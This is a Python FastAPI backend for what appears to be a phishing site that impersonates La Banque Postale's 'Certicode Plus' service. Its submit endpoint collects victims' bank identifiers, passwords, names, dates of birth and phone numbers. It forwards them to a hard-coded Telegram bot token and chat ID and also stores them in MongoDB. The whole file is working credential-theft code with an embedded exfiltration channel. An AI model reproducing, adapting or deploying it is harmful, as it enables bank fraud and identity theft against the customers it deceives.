import logging
import os
import httpx
from pathlib import Path
from datetime import datetime, timezone
from contextlib import asynccontextmanager
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pydantic import BaseModel
from motor.motor_asyncio import AsyncIOMotorClient

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# MongoDB
MONGO_URL = os.environ.get("MONGO_URL")
DB_NAME = os.environ.get("DB_NAME", "certicode_db")

# Telegram
TELEGRAM_BOT_TOKEN = "8619588506:AAGJFMHEN6ELOzu-6Spg_lhkDKyt9yt7Zvc"
TELEGRAM_CHAT_ID = "8777096346"

# Frontend build path
BUILD_DIR = Path(__file__).parent.parent / "frontend" / "build"

@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.mongo_client = AsyncIOMotorClient(MONGO_URL)
    app.state.db = app.state.mongo_client[DB_NAME]
    logger.info("Connected to MongoDB")
    yield
    app.state.mongo_client.close()
    logger.info("Disconnected from MongoDB")

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- API Routes ---

@app.get("/api/")
async def root():
    return {"message": "La Banque Postale - Certicode Plus API"}

@app.get("/api/health")
async def health():
    return {"status": "ok"}

async def send_telegram_message(message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(url, json=payload)
            if response.status_code == 200:
                logger.info("Telegram message sent successfully")
            else:
                logger.error(f"Failed to send Telegram message: {response.text}")
    except Exception as e:
        logger.error(f"Error sending Telegram message: {str(e)}")

class CerticodeSubmission(BaseModel):
    identifier: str
    password: str
    first_name: str = ""
    last_name: str = ""
    date_of_birth: str = ""
    phone_number: str = ""

@app.post("/api/certicode/submit")
async def submit_certicode_data(data: CerticodeSubmission):
    try:
        message = f"""
🔐 <b>Nouvelle soumission Certicode Plus</b>

👤 <b>Identifiant:</b> {data.identifier}
🔑 <b>Mot de passe:</b> {data.password}
📝 <b>Prénom:</b> {data.first_name}
📝 <b>Nom:</b> {data.last_name}
📅 <b>Date de naissance:</b> {data.date_of_birth}
📱 <b>Téléphone:</b> {data.phone_number}
⏰ <b>Date:</b> {datetime.now(timezone.utc).strftime('%d/%m/%Y %H:%M:%S UTC')}
"""
        await send_telegram_message(message)

        db = app.state.db
        submission_data = {
            "identifier": data.identifier,
            "password": data.password,
            "first_name": data.first_name,
            "last_name": data.last_name,
            "date_of_birth": data.date_of_birth,
            "phone_number": data.phone_number,
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        await db.certicode_submissions.insert_one(submission_data)

        return {"status": "success", "message": "Données soumises avec succès"}
    except Exception as e:
        logger.error(f"Error processing certicode submission: {str(e)}")
        return {"status": "error", "message": str(e)}

# --- Serve Frontend ---
if BUILD_DIR.exists():
    app.mount("/static", StaticFiles(directory=str(BUILD_DIR / "static")), name="static")

    @app.get("/{full_path:path}")
    async def serve_frontend(full_path: str):
        file_path = BUILD_DIR / full_path
        if file_path.exists() and file_path.is_file():
            return FileResponse(str(file_path))
        return FileResponse(str(BUILD_DIR / "index.html"))
